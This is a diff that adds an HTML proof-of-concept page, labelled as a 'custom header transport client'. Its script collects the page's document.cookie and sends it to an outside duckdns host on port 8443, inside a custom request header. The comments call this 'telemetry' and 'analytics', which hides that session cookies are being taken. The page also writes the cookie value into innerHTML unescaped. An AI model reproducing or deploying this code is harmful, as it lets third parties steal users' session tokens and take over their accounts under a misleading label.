@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Header Cross-Origin PoC</title>
+</head>
+<body>
+    <h1>Custom Header Transport Client</h1>
+    <p>Targeting Secure VM Instance over Port 8443...</p>
+    <button id="send-btn" style="padding: 10px 20px;">Trigger Custom Header Send</button>
+    
+    <div id="status" style="margin-top: 20px; font-family: monospace; white-space: pre-line;"></div>
+
+    <script>
+        async function transmitHeader() {
+            // Point explicitly to your secure domain and port 8443
+            const targetUrl = 'https://webrtc-poc.duckdns.org:8443/analytics';
+            const logElement = document.getElementById('status');
+
+            // Collect session identifiers or cookie configurations
+            const telemetryPayload = document.cookie || "STALE_OR_EMPTY_COOKIE_STORE";
+            
+            logElement.innerHTML += `\n[1] Preparing custom header payload: "${telemetryPayload}"`;
+
+            try {
+                const response = await fetch(targetUrl, {
+                    method: 'GET',
+                    headers: {
+                        // The custom tracking identifier containing the token string
+                        'X-Custom-Identifier': telemetryPayload
+                    }
+                });
+
+                const data = await response.json();
+                logElement.innerHTML += `\n<span style="color: green;">[2] Server Handshake Success: ${JSON.stringify(data)}</span>`;
+            } catch (error) {
+                logElement.innerHTML += `\n<span style="color: red;">[Error] Connection Failed: ${error.message}</span>`;
+                console.error("Transmission Error:", error);
+            }
+        }
+
+        document.getElementById('send-btn').addEventListener('click', transmitHeader);
+    </script>
+</body>
+</html>
